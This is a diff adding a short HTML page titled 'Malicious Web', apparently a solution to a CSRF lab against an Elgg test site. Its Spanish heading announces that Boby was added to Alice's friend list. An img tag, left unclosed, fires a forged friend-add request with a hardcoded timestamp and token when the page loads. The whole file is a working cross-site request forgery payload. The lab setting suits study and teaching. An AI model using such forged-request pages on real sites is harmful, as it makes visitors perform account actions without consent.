@@ -1,0 +1,14 @@
+<html>
+<head>
+<title>
+Malicious Web
+</title>
+</head>
+<body>
+<h1>Boby ha sido agregado a la lista de amigos de Alice mediante el Ataque CSRF
+</h1>
+
+<img src="http://www.csrflabelgg.com/action/friends/add?friend=40&__elgg_ts=1559529765&__elgg_token=f56172a3324b23dd0ff7a2983a56397c"
+</body>
+</html>
+
